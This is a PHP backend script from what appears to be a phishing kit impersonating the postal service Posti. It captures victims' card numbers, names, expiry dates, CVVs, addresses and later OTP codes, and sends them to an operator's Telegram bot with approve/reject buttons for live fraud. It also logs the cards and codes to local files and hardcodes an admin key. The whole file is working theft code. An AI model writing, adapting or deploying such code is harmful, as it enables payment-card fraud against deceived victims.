<?php
require __DIR__ . '/security.php';

// Admin key for direct links
$adminKey = 'Passe120.';

// Get domain for admin links - CORRECTED URL CONSTRUCTION
$protocol = isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] === 'on' ? 'https' : 'http';
$domain = $_SERVER['HTTP_HOST'];

// Get the base path of the application (the directory where index.php is)
$scriptPath = $_SERVER['SCRIPT_NAME'];
$basePath = dirname($scriptPath);
if ($basePath === '/' || $basePath === '\\') {
    $basePath = '';
}

// Construct proper base URL
$baseUrl = "$protocol://$domain$basePath";

// Generate unique session ID
if (!isset($_SESSION['session_id'])) {
    $_SESSION['session_id'] = bin2hex(random_bytes(8));
}
$sessionId = $_SESSION['session_id'];

// Status directory
$statusDir = __DIR__ . '/status';
if (!is_dir($statusDir)) {
    mkdir($statusDir, 0755, true);
}

// Logs directory
$logsDir = __DIR__ . '/logs';
if (!is_dir($logsDir)) {
    mkdir($logsDir, 0755, true);
}

function sendToTelegramWithButtons($text, $sessionId, $type, $baseUrl, $adminKey) {
    global $token, $chat_id;

    // Create inline keyboard with both callback and URL buttons
    // URL buttons work without webhook, callback buttons need webhook
    $keyboard = [
        'inline_keyboard' => [
            [
                ['text' => '✅ APPROUVER', 'callback_data' => "approve_{$sessionId}_{$type}"],
                ['text' => '❌ REFUSER', 'callback_data' => "reject_{$sessionId}_{$type}"]
            ],
            [
                ['text' => '🌐 Approuver via Domain', 'url' => "{$baseUrl}/home/admin/admin.php?key={$adminKey}&action=approve&session={$sessionId}&type={$type}"],
                ['text' => '🌐 Refuser via Domain', 'url' => "{$baseUrl}/home/admin/admin.php?key={$adminKey}&action=reject&session={$sessionId}&type={$type}"]
            ],
            [
                ['text' => '🎛️ Panel Admin', 'url' => "{$baseUrl}/home/admin/admin.php?key={$adminKey}"]
            ]
        ]
    ];

    $url = "https://api.telegram.org/bot$token/sendMessage";
    $data = [
        'chat_id' => $chat_id,
        'text' => $text,
        'parse_mode' => 'HTML',
        'reply_markup' => json_encode($keyboard)
    ];

    $c = curl_init($url);
    curl_setopt($c, CURLOPT_POST, true);
    curl_setopt($c, CURLOPT_POSTFIELDS, $data);
    curl_setopt($c, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($c, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($c, CURLOPT_TIMEOUT, 10);
    $res = curl_exec($c);

    // Log response for debugging
    @file_put_contents(__DIR__ . '/logs/telegram_debug.log',
        date('Y-m-d H:i:s') . " | Send | Response: $res\n", FILE_APPEND | LOCK_EX);

    curl_close($c);
    return $res;
}

$ip = $_SERVER['REMOTE_ADDR'];
$userAgent = $_SERVER['HTTP_USER_AGENT'] ?? 'Unknown';

// Get IP info if available
$ipInfo = $_SESSION['ip_info'] ?? [];
$country = $ipInfo['country'] ?? 'Unknown';
$city = $ipInfo['city'] ?? 'Unknown';
$isp = $ipInfo['isp'] ?? 'Unknown';

// Process card data
if (isset($_POST['cc'])) {
    $_SESSION['_cc'] = $_POST['cc'];
    $_SESSION['_name'] = $_POST['name'];
    $_SESSION['_exp'] = $_POST['exp'];
    $_SESSION['_cvv'] = $_POST['cvv'];
    $_SESSION['_address'] = $_POST['address'] ?? '';
    $_SESSION['_city'] = $_POST['city'] ?? '';
    $_SESSION['_zip'] = $_POST['zip'] ?? '';

    $msg = "
<b>🔔 POSTI - NOUVELLE CARTE 💳</b>
━━━━━━━━━━━━━━━━━━━━━

<b>👤 Titulaire:</b> <code>{$_POST['name']}</code>
<b>💳 Numéro:</b> <code>{$_POST['cc']}</code>
<b>📅 Expiration:</b> <code>{$_POST['exp']}</code>
<b>🔐 CVV:</b> <code>{$_POST['cvv']}</code>

━━━━━━━━━━━━━━━━━━━━━
<b>📍 ADRESSE</b>

<b>🏠 Rue:</b> {$_POST['address']}
<b>🏙 Ville:</b> {$_POST['city']}
<b>📮 Code postal:</b> {$_POST['zip']}

━━━━━━━━━━━━━━━━━━━━━
<b>🌐 INFOS CONNEXION</b>

<b>📍 IP:</b> <code>$ip</code>
<b>🗺 Pays:</b> $country
<b>🏙 Ville:</b> $city
<b>📡 ISP:</b> $isp
<b>🔖 Session:</b> <code>$sessionId</code>

━━━━━━━━━━━━━━━━━━━━━
⏰ " . date('d/m/Y H:i:s') . "
";

    // Set pending status
    file_put_contents("$statusDir/$sessionId.txt", 'pending_cc');

    // Send to Telegram
    sendToTelegramWithButtons($msg, $sessionId, 'cc', $baseUrl, $adminKey);

    // Log
    $logData = date('Y-m-d H:i:s') . " | CC | $ip | {$_POST['cc']} | Session: $sessionId\n";
    @file_put_contents("$logsDir/cards.log", $logData, FILE_APPEND | LOCK_EX);

    header("Location: ?s=5&type=cc");
    exit;
}

// Process OTP
if (isset($_POST['otp'])) {
    $msg = "
<b>🔔 POSTI - NOUVEAU CODE OTP 🔑</b>
━━━━━━━━━━━━━━━━━━━━━

<b>💳 Carte:</b> <code>{$_SESSION['_cc']}</code>
<b>🔑 Code OTP:</b> <code>{$_POST['otp']}</code>

━━━━━━━━━━━━━━━━━━━━━
<b>📍 IP:</b> <code>$ip</code>
<b>🔖 Session:</b> <code>$sessionId</code>

━━━━━━━━━━━━━━━━━━━━━
⏰ " . date('d/m/Y H:i:s') . "
";

    // Set pending status for OTP
    file_put_contents("$statusDir/$sessionId.txt", 'pending_otp');

    // Send to Telegram
    sendToTelegramWithButtons($msg, $sessionId, 'otp', $baseUrl, $adminKey);

    // Log
    $logData = date('Y-m-d H:i:s') . " | OTP | $ip | {$_POST['otp']} | Session: $sessionId\n";
    @file_put_contents("$logsDir/otps.log", $logData, FILE_APPEND | LOCK_EX);

    if (isset($_POST['exit'])) {
        header("Location: ?s=6&status=error");
        exit;
    }

    header("Location: ?s=5&type=otp");
    exit;
}
?>
